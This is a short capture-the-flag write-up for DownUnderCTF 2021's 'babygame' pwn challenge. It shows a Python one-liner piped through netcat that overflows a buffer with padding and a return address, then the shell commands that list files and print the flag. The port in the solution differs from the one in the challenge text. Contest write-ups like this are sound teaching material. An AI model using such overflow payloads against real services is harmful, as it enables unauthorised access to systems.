# babygame
>Not your typical shell game...

> Admin note: the server runs in a restricted environment where some of your favourite files might not exist. If you need a file for your exploit, use a file you know definitely exists (the binary tells you of at least one!)

> Author: grub

> nc pwn-2021.duc.tf 31907

[babygame](https://drive.google.com/file/d/1HKFroNuq-b-LWmU3S3u2hS6rhEVezxNp/view?usp=sharing)

# Solution

```
┌──(kali㉿kali)-[~/Desktop/DownUnderCTF21]
└─$ (python -c 'print "a"*0x18 + "\xd8\x11@\x00\x00\x00\x00\x00"'; cat) |  nc pwn-2021.duc.tf 31921       148 ⨯ 1 ⚙

Fool me once, shame on you. Fool me twice, shame on me.

Seriously though, what features would be cool? Maybe it could play a song?


W...w...Wait? Who put this backdoor out back here?
ls
flag.txt
pwn
cat flag.txt
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}

```
